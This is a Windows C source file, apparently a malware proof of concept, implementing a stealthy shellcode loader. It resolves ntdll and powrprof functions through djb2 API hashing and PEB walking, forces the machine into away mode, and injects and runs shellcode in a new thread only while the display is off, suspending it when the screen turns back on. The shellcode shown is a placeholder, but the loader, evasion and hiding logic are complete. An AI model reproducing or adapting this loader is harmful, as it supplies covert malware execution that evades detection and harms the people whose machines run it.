#pragma once
#include <windows.h>

typedef struct _INITIAL_TEB {
	PVOID                StackBase;
	PVOID                StackLimit;
	PVOID                StackCommit;
	PVOID                StackCommitMax;
	PVOID                StackReserved;
} INITIAL_TEB, * PINITIAL_TEB;

typedef struct __CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _PEB_LDR_DATA {
	ULONG                   Length;
	ULONG                   Initialized;
	PVOID                   SsHandle;
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef PVOID PACTIVATION_CONTEXT;

typedef struct _RTL_ACTIVATION_CONTEXT_STACK_FRAME {
	struct __RTL_ACTIVATION_CONTEXT_STACK_FRAME* Previous;
	PACTIVATION_CONTEXT ActivationContext;
	ULONG Flags;
} RTL_ACTIVATION_CONTEXT_STACK_FRAME, * PRTL_ACTIVATION_CONTEXT_STACK_FRAME;

typedef struct _ACTIVATION_CONTEXT_STACK {
	PRTL_ACTIVATION_CONTEXT_STACK_FRAME ActiveFrame;
	LIST_ENTRY FrameListCache;
	ULONG Flags;
	ULONG NextCookieSequenceNumber;
	ULONG StackId;
} ACTIVATION_CONTEXT_STACK, * PACTIVATION_CONTEXT_STACK;

typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING, * PUNICODE_STR;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	PVOID RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _LDR_MODULE {
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
	PVOID                   BaseAddress;
	PVOID                   EntryPoint;
	ULONG                   SizeOfImage;
	UNICODE_STRING          FullDllName;
	UNICODE_STRING          BaseDllName;
	ULONG                   Flags;
	SHORT                   LoadCount;
	SHORT                   TlsIndex;
	LIST_ENTRY              HashTableEntry;
	ULONG                   TimeDateStamp;
} LDR_MODULE, * PLDR_MODULE;

typedef struct _GDI_TEB_BATCH {
	ULONG Offset;
	ULONG HDC;
	ULONG Buffer[310];
} GDI_TEB_BATCH, * PGDI_TEB_BATCH;

typedef struct _TEB_ACTIVE_FRAME_CONTEXT {
	ULONG Flags;
	PCHAR FrameName;
} TEB_ACTIVE_FRAME_CONTEXT, * PTEB_ACTIVE_FRAME_CONTEXT;

typedef struct _TEB_ACTIVE_FRAME {
	ULONG Flags;
	struct _TEB_ACTIVE_FRAME* Previous;
	PTEB_ACTIVE_FRAME_CONTEXT Context;
} TEB_ACTIVE_FRAME, * PTEB_ACTIVE_FRAME;

typedef struct _PEB {
	BOOLEAN                 InheritedAddressSpace;
	BOOLEAN                 ReadImageFileExecOptions;
	BOOLEAN                 BeingDebugged;
	BOOLEAN                 Spare;
	HANDLE                  Mutant;
	PVOID                   ImageBase;
	PPEB_LDR_DATA           LoaderData;
	PVOID                   ProcessParameters;
	PVOID                   SubSystemData;
	PVOID                   ProcessHeap;
	PVOID                   FastPebLock;
	PVOID                   FastPebLockRoutine;
	PVOID                   FastPebUnlockRoutine;
	ULONG                   EnvironmentUpdateCount;
	PVOID* KernelCallbackTable;
	PVOID                   EventLogSection;
	PVOID                   EventLog;
	PVOID                   FreeList;
	ULONG                   TlsExpansionCounter;
	PVOID                   TlsBitmap;
	ULONG                   TlsBitmapBits[0x2];
	PVOID                   ReadOnlySharedMemoryBase;
	PVOID                   ReadOnlySharedMemoryHeap;
	PVOID* ReadOnlyStaticServerData;
	PVOID                   AnsiCodePageData;
	PVOID                   OemCodePageData;
	PVOID                   UnicodeCaseTableData;
	ULONG                   NumberOfProcessors;
	ULONG                   NtGlobalFlag;
	BYTE                    Spare2[0x4];
	LARGE_INTEGER           CriticalSectionTimeout;
	ULONG                   HeapSegmentReserve;
	ULONG                   HeapSegmentCommit;
	ULONG                   HeapDeCommitTotalFreeThreshold;
	ULONG                   HeapDeCommitFreeBlockThreshold;
	ULONG                   NumberOfHeaps;
	ULONG                   MaximumNumberOfHeaps;
	PVOID** ProcessHeaps;
	PVOID                   GdiSharedHandleTable;
	PVOID                   ProcessStarterHelper;
	PVOID                   GdiDCAttributeList;
	PVOID                   LoaderLock;
	ULONG                   OSMajorVersion;
	ULONG                   OSMinorVersion;
	ULONG                   OSBuildNumber;
	ULONG                   OSPlatformId;
	ULONG                   ImageSubSystem;
	ULONG                   ImageSubSystemMajorVersion;
	ULONG                   ImageSubSystemMinorVersion;
	ULONG                   GdiHandleBuffer[0x22];
	ULONG                   PostProcessInitRoutine;
	ULONG                   TlsExpansionBitmap;
	BYTE                    TlsExpansionBitmapBits[0x80];
	ULONG                   SessionId;
} PEB, * PPEB;

typedef struct _TEB {
	NT_TIB				NtTib;
	PVOID				EnvironmentPointer;
	CLIENT_ID			ClientId;
	PVOID				ActiveRpcHandle;
	PVOID				ThreadLocalStoragePointer;
	PPEB				ProcessEnvironmentBlock;
	ULONG               LastErrorValue;
	ULONG               CountOfOwnedCriticalSections;
	PVOID				CsrClientThread;
	PVOID				Win32ThreadInfo;
	ULONG               User32Reserved[26];
	ULONG               UserReserved[5];
	PVOID				WOW32Reserved;
	LCID                CurrentLocale;
	ULONG               FpSoftwareStatusRegister;
	PVOID				SystemReserved1[54];
	LONG                ExceptionCode;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PACTIVATION_CONTEXT_STACK* ActivationContextStackPointer;
	UCHAR                  SpareBytes1[0x30 - 3 * sizeof(PVOID)];
	ULONG                  TxFsContext;
#elif (NTDDI_VERSION >= NTDDI_WS03)
	PACTIVATION_CONTEXT_STACK ActivationContextStackPointer;
	UCHAR                  SpareBytes1[0x34 - 3 * sizeof(PVOID)];
#else
	ACTIVATION_CONTEXT_STACK ActivationContextStack;
	UCHAR                  SpareBytes1[24];
#endif
	GDI_TEB_BATCH			GdiTebBatch;
	CLIENT_ID				RealClientId;
	PVOID					GdiCachedProcessHandle;
	ULONG                   GdiClientPID;
	ULONG                   GdiClientTID;
	PVOID					GdiThreadLocalInfo;
	PSIZE_T					Win32ClientInfo[62];
	PVOID					glDispatchTable[233];
	PSIZE_T					glReserved1[29];
	PVOID					glReserved2;
	PVOID					glSectionInfo;
	PVOID					glSection;
	PVOID					glTable;
	PVOID					glCurrentRC;
	PVOID					glContext;
	NTSTATUS                LastStatusValue;
	UNICODE_STRING			StaticUnicodeString;
	WCHAR                   StaticUnicodeBuffer[261];
	PVOID					DeallocationStack;
	PVOID					TlsSlots[64];
	LIST_ENTRY				TlsLinks;
	PVOID					Vdm;
	PVOID					ReservedForNtRpc;
	PVOID					DbgSsReserved[2];
#if (NTDDI_VERSION >= NTDDI_WS03)
	ULONG                   HardErrorMode;
#else
	ULONG                  HardErrorsAreDisabled;
#endif
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PVOID					Instrumentation[13 - sizeof(GUID) / sizeof(PVOID)];
	GUID                    ActivityId;
	PVOID					SubProcessTag;
	PVOID					EtwLocalData;
	PVOID					EtwTraceData;
#elif (NTDDI_VERSION >= NTDDI_WS03)
	PVOID					Instrumentation[14];
	PVOID					SubProcessTag;
	PVOID					EtwLocalData;
#else
	PVOID					Instrumentation[16];
#endif
	PVOID					WinSockData;
	ULONG					GdiBatchCount;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	BOOLEAN                SpareBool0;
	BOOLEAN                SpareBool1;
	BOOLEAN                SpareBool2;
#else
	BOOLEAN                InDbgPrint;
	BOOLEAN                FreeStackOnTermination;
	BOOLEAN                HasFiberData;
#endif
	UCHAR                  IdealProcessor;
#if (NTDDI_VERSION >= NTDDI_WS03)
	ULONG                  GuaranteedStackBytes;
#else
	ULONG                  Spare3;
#endif
	PVOID				   ReservedForPerf;
	PVOID				   ReservedForOle;
	ULONG                  WaitingOnLoaderLock;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PVOID				   SavedPriorityState;
	ULONG_PTR			   SoftPatchPtr1;
	ULONG_PTR			   ThreadPoolData;
#elif (NTDDI_VERSION >= NTDDI_WS03)
	ULONG_PTR			   SparePointer1;
	ULONG_PTR              SoftPatchPtr1;
	ULONG_PTR              SoftPatchPtr2;
#else
	Wx86ThreadState        Wx86Thread;
#endif
	PVOID* TlsExpansionSlots;
#if defined(_WIN64) && !defined(EXPLICIT_32BIT)
	PVOID                  DeallocationBStore;
	PVOID                  BStoreLimit;
#endif
	ULONG                  ImpersonationLocale;
	ULONG                  IsImpersonating;
	PVOID                  NlsCache;
	PVOID                  pShimData;
	ULONG                  HeapVirtualAffinity;
	HANDLE                 CurrentTransactionHandle;
	PTEB_ACTIVE_FRAME      ActiveFrame;
#if (NTDDI_VERSION >= NTDDI_WS03)
	PVOID FlsData;
#endif
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PVOID PreferredLangauges;
	PVOID UserPrefLanguages;
	PVOID MergedPrefLanguages;
	ULONG MuiImpersonation;
	union
	{
		struct
		{
			USHORT SpareCrossTebFlags : 16;
		};
		USHORT CrossTebFlags;
	};
	union
	{
		struct
		{
			USHORT DbgSafeThunkCall : 1;
			USHORT DbgInDebugPrint : 1;
			USHORT DbgHasFiberData : 1;
			USHORT DbgSkipThreadAttach : 1;
			USHORT DbgWerInShipAssertCode : 1;
			USHORT DbgIssuedInitialBp : 1;
			USHORT DbgClonedThread : 1;
			USHORT SpareSameTebBits : 9;
		};
		USHORT SameTebFlags;
	};
	PVOID TxnScopeEntercallback;
	PVOID TxnScopeExitCAllback;
	PVOID TxnScopeContext;
	ULONG LockCount;
	ULONG ProcessRundown;
	ULONG64 LastSwitchTime;
	ULONG64 TotalSwitchOutTime;
	LARGE_INTEGER WaitReasonBitMap;
#else
	BOOLEAN SafeThunkCall;
	BOOLEAN BooleanSpare[3];
#endif
} TEB, * PTEB;

typedef ULONG CALLBACK DEVICE_NOTIFY_CALLBACK_ROUTINE(
	_In_opt_ PVOID Context,
	_In_ ULONG Type,
	_In_ PVOID Setting
);
typedef DEVICE_NOTIFY_CALLBACK_ROUTINE* PDEVICE_NOTIFY_CALLBACK_ROUTINE;

typedef struct _DEVICE_NOTIFY_SUBSCRIBE_PARAMETERS {
	PDEVICE_NOTIFY_CALLBACK_ROUTINE Callback;
	PVOID Context;
} DEVICE_NOTIFY_SUBSCRIBE_PARAMETERS, * PDEVICE_NOTIFY_SUBSCRIBE_PARAMETERS;

// PROGRAM FUNCTION PROTOTYPE
ULONG   CALLBACK HandlePowerNotifications(PVOID Context, ULONG Type, PVOID Setting);
DWORD64 VxGetFunctionAddress(DWORD64 pLoadedModule, DWORD64 dwHash);
VOID    VxZeroMemory(PVOID Destination, SIZE_T Size);
DWORD   djb2(PBYTE str);
PTEB    RtlGetTeb();
VOID    Inject(VOID);


// NTDLL FUNCTION HASH
#define RtlMoveMemoryHash             0x7adcac96
#define NtAllocateVirtualMemoryHash   0xc3f2b89b
#define NtProtectVirtualMemoryHash    0x50c76a37
#define NtCreateThreadExHash          0x2991015f
#define NtWaitForSingleObjectHash     0x4ea11bcb
#define NtResumeThreadHash            0x7e9c459f
#define NtSuspendThreadHash           0xe740d3b0
#define LdrLoadDllHash                0xfc700412
#define RtlInitUnicodeStringHash      0x02febf38
#define NtSetThreadExecutionStateHash 0xf95a732f

// NTDLL FUNCTION DELEGATES
typedef VOID(NTAPI* RtlInitUnicodeStringDelegate)(PUNICODE_STRING, PCWSTR);
typedef VOID(NTAPI* RtlMoveMemoryDelegate) (PVOID, CONST PVOID, SIZE_T);
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemoryDelegate) (HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NtProtectVirtualMemoryDelegate) (HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtCreateThreadExDelegate) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, LPTHREAD_START_ROUTINE, LPVOID, BOOL, SIZE_T, SIZE_T, SIZE_T, LPVOID);
typedef NTSTATUS(NTAPI* NtWaitForSingleObjectDelegate) (HANDLE, BOOLEAN, CONST PLARGE_INTEGER);
typedef NTSTATUS(NTAPI* NtSuspendThreadDelegate) (HANDLE, PULONG);
typedef NTSTATUS(NTAPI* NtResumeThreadDelegate) (HANDLE, PULONG);
typedef NTSTATUS(NTAPI* LdrLoadDllDelegate) (PWCHAR, ULONG, PUNICODE_STRING, PHANDLE);
typedef NTSTATUS(NTAPI* NtSetThreadExecutionStateDelegate) (EXECUTION_STATE, PEXECUTION_STATE);

// POWRPROF FUNCTION HASH
#define PowerSettingRegisterNotificationHash   0xEF255A2B

// POWRPROF FUNCTION DELEGATE
typedef DWORD(WINAPI* PowerSettingRegisterNotificationDelegate) (LPCGUID, DWORD, HANDLE, PHPOWERNOTIFY);

// VX API TABLE - smelly 
typedef struct _VxApiTable {
	RtlInitUnicodeStringDelegate             _RtlInitUnicodeString;
	RtlMoveMemoryDelegate                    _RtlMoveMemory;
	NtAllocateVirtualMemoryDelegate          _NtAllocateVirtualMemory;
	NtProtectVirtualMemoryDelegate           _NtProtectVirtualMemory;
	NtCreateThreadExDelegate                 _NtCreateThreadEx;
	NtWaitForSingleObjectDelegate            _NtWaitForSingleObject;
	NtSuspendThreadDelegate                  _NtSuspendThread;
	NtResumeThreadDelegate                   _NtResumeThread;
	LdrLoadDllDelegate                       _LdrLoadDll;
	NtSetThreadExecutionStateDelegate        _NtSetThreadExecutionState;

	PowerSettingRegisterNotificationDelegate _PowerSettingRegisterNotification;
} VxApiTable, * PVxApiTable;

// MACROS
#ifndef NT_SUCCESS
#define NT_SUCCESS(StatCode)  ((NTSTATUS)(StatCode) >= 0)
#endif
#ifndef DEVICE_NOTIFY_CALLBACK
#define DEVICE_NOTIFY_CALLBACK 2
#endif

// GLOBAL VARAIBLES
BOOL bLoop;
HANDLE hNotificationRegister;
HANDLE hHostThread;
VxApiTable Table;
DEVICE_NOTIFY_SUBSCRIBE_PARAMETERS DeviceNotifySuscribeParametes;

int wmain() {
	PTEB pTeb = RtlGetTeb();
	PPEB pPeb = pTeb->ProcessEnvironmentBlock;

	// Get NTDLL Module
	PLDR_MODULE pLoadedModule = (PLDR_MODULE)((PBYTE)pPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Dynamically load NTDLL function
	Table._RtlInitUnicodeString = (RtlInitUnicodeStringDelegate)VxGetFunctionAddress((DWORD64)pLoadedModule->BaseAddress, RtlInitUnicodeStringHash);
	Table._RtlMoveMemory = (RtlMoveMemoryDelegate)VxGetFunctionAddress((DWORD64)pLoadedModule->BaseAddress, RtlMoveMemoryHash);
	Table._NtAllocateVirtualMemory = (NtAllocateVirtualMemoryDelegate)VxGetFunctionAddress((DWORD64)pLoadedModule->BaseAddress, NtAllocateVirtualMemoryHash);
	Table._NtProtectVirtualMemory = (NtProtectVirtualMemoryDelegate)VxGetFunctionAddress((DWORD64)pLoadedModule->BaseAddress, NtProtectVirtualMemoryHash);
	Table._NtCreateThreadEx = (NtCreateThreadExDelegate)VxGetFunctionAddress((DWORD64)pLoadedModule->BaseAddress, NtCreateThreadExHash);
	Table._NtWaitForSingleObject = (NtWaitForSingleObjectDelegate)VxGetFunctionAddress((DWORD64)pLoadedModule->BaseAddress, NtWaitForSingleObjectHash);
	Table._NtResumeThread = (NtResumeThreadDelegate)VxGetFunctionAddress((DWORD64)pLoadedModule->BaseAddress, NtResumeThreadHash);
	Table._NtSuspendThread = (NtSuspendThreadDelegate)VxGetFunctionAddress((DWORD64)pLoadedModule->BaseAddress, NtSuspendThreadHash);
	Table._LdrLoadDll = (LdrLoadDllDelegate)VxGetFunctionAddress((DWORD64)pLoadedModule->BaseAddress, LdrLoadDllHash);
	Table._NtSetThreadExecutionState = (NtSetThreadExecutionStateDelegate)VxGetFunctionAddress((DWORD64)pLoadedModule->BaseAddress, NtSetThreadExecutionStateHash);

	// Check that all addresses were retrieved 
	if (!Table._RtlMoveMemory || !Table._NtAllocateVirtualMemory || !Table._NtProtectVirtualMemory || !Table._NtCreateThreadEx
		|| !Table._NtWaitForSingleObject || !Table._NtResumeThread || !Table._NtSuspendThread || !Table._LdrLoadDll
		|| !Table._RtlInitUnicodeString || !Table._NtSetThreadExecutionState)
		return 1;

	// Load the Powrprof.dll into the process and get base address
	DWORD64 dwPowrprofBaseAddres = 0;
	UNICODE_STRING usPowrprof;
	VxZeroMemory(&usPowrprof, sizeof(UNICODE_STRING));

	WCHAR pwPowrprof[16];
	VxZeroMemory(pwPowrprof, sizeof(pwPowrprof));
	pwPowrprof[0] = 'P'; pwPowrprof[1] = 'o';
	pwPowrprof[2] = 'w'; pwPowrprof[3] = 'r';
	pwPowrprof[4] = 'p'; pwPowrprof[5] = 'r';
	pwPowrprof[6] = 'o'; pwPowrprof[7] = 'f';
	pwPowrprof[8] = '\0';
	Table._RtlInitUnicodeString(&usPowrprof, pwPowrprof);
	Table._LdrLoadDll(NULL, 0, &usPowrprof, (PHANDLE)&dwPowrprofBaseAddres);

	// Check that all addresses were retrieved 
	Table._PowerSettingRegisterNotification = (PowerSettingRegisterNotificationDelegate)VxGetFunctionAddress(dwPowrprofBaseAddres, PowerSettingRegisterNotificationHash);
	if (!Table._PowerSettingRegisterNotification)
		return 1;

	// Register the function
	DEVICE_NOTIFY_SUBSCRIBE_PARAMETERS NotificationsParameters;
	NotificationsParameters.Callback = HandlePowerNotifications;
	NotificationsParameters.Context = NULL;
	DWORD success = Table._PowerSettingRegisterNotification(&GUID_CONSOLE_DISPLAY_STATE, DEVICE_NOTIFY_CALLBACK, (HANDLE)&NotificationsParameters, &hNotificationRegister);
	if (success != 0x0)
		return 1;

	// Change execution state
	DWORD dwExecutionState;
	Table._NtSetThreadExecutionState(ES_AWAYMODE_REQUIRED | ES_CONTINUOUS | ES_SYSTEM_REQUIRED, (PEXECUTION_STATE)&dwExecutionState);

	// Loop till the end of the world
	bLoop = TRUE;
	while (bLoop) {}
	return 0;
}

ULONG CALLBACK HandlePowerNotifications(PVOID Context, ULONG Type, PVOID Setting) {
	PPOWERBROADCAST_SETTING PowerSettings = (PPOWERBROADCAST_SETTING)Setting;
	if (Type == PBT_POWERSETTINGCHANGE && PowerSettings->PowerSetting == GUID_CONSOLE_DISPLAY_STATE) {
		switch (*PowerSettings->Data) {
		// Display is off or dimmed
		case 0x0:
		case 0x2: {
			if (hHostThread == NULL)
				Inject();
			else
				Table._NtResumeThread(hHostThread, NULL);
			break;
		}
		
		// Display is on
		case 0x1: {
			if (hHostThread) {
				Table._NtSuspendThread(hHostThread, NULL);
			}
			break;
		}

		default: { break; }
		}

	}
	return 0;
}

VOID Inject(VOID) {
	HRESULT hResult;
	char shellcode[] = "\x90\x90\x90\x90\xcc\xcc\xcc\xcc";

	// Allocate memory
	PVOID lpAddress = NULL;
	SIZE_T szDataSize = sizeof(shellcode);
	hResult = Table._NtAllocateVirtualMemory((HANDLE)-1, &lpAddress, 0, &szDataSize, MEM_COMMIT, PAGE_READWRITE);
	if (!NT_SUCCESS(hResult))
		return;

	// Write Memory
	Table._RtlMoveMemory(lpAddress, shellcode, sizeof(shellcode));

	// Change page permissions
	ULONG ulOldProtect = NULL;
	Table._NtProtectVirtualMemory((HANDLE)-1, &lpAddress, &szDataSize, PAGE_EXECUTE_READ, &ulOldProtect);

	// Create thread
	OBJECT_ATTRIBUTES ObjectAttributes;
	ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
	ObjectAttributes.RootDirectory = NULL;
	ObjectAttributes.Attributes = 0;
	ObjectAttributes.ObjectName = NULL;
	ObjectAttributes.SecurityDescriptor = NULL;
	ObjectAttributes.SecurityQualityOfService = NULL;

	INITIAL_TEB InitialTeb;
	VxZeroMemory(&InitialTeb, sizeof(INITIAL_TEB));
	hResult = Table._NtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, 0, 0, 0, NULL);
	if (!NT_SUCCESS(hResult)) {
		return;
	}

	// Wait for 1 seconds
	LARGE_INTEGER Timeout;
	Timeout.QuadPart = -10000000;
	Table._NtWaitForSingleObject(hHostThread, FALSE, &Timeout);
	return;
}

DWORD64 VxGetFunctionAddress(DWORD64 dwModuleBase, DWORD64 dwHash) {
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dwModuleBase;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return 1;

	PIMAGE_NT_HEADERS pImageNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)pDosHeader + pDosHeader->e_lfanew);
	if (pImageNtHeader->Signature != IMAGE_NT_SIGNATURE)
		return 1;

	PIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)(dwModuleBase + (pDosHeader->e_lfanew) + sizeof(DWORD));
	PIMAGE_OPTIONAL_HEADER pImageOptioalHeader = (PIMAGE_OPTIONAL_HEADER)((PBYTE)pImageFileHeader + sizeof(IMAGE_FILE_HEADER));

	// Parse the export table of NTDLL
	PIMAGE_EXPORT_DIRECTORY pExportTable = (PIMAGE_EXPORT_DIRECTORY)(dwModuleBase + pImageOptioalHeader->DataDirectory[0].VirtualAddress);
	PDWORD pFunctionAddressTable = (PDWORD)((LPBYTE)dwModuleBase + pExportTable->AddressOfFunctions);
	PDWORD pFunctionNameAddressTable = (PDWORD)((LPBYTE)dwModuleBase + pExportTable->AddressOfNames);
	PWORD pFunctionNameOrdinalTable = (PWORD)((LPBYTE)dwModuleBase + pExportTable->AddressOfNameOrdinals);
	DWORD x;

	for (x = 0; x < pExportTable->NumberOfNames; x++) {
		PBYTE pFunctionName = (PBYTE)(dwModuleBase + pFunctionNameAddressTable[x]);
		if (dwHash == djb2(pFunctionName)) {
			return (DWORD64)(dwModuleBase + pFunctionAddressTable[pFunctionNameOrdinalTable[x]]);
		}
	}

	return TRUE;
}

VOID VxZeroMemory(PVOID Destination, SIZE_T Size) {
	PULONG Dest = (PULONG)Destination;
	SIZE_T Count = Size / sizeof(ULONG);

	while (Count > 0) {
		*Dest = 0;
		Dest++;
		Count--;
	}

	return;
}

DWORD djb2(PBYTE str) {
	DWORD dwHash = 0x7734;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

PTEB RtlGetTeb() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}
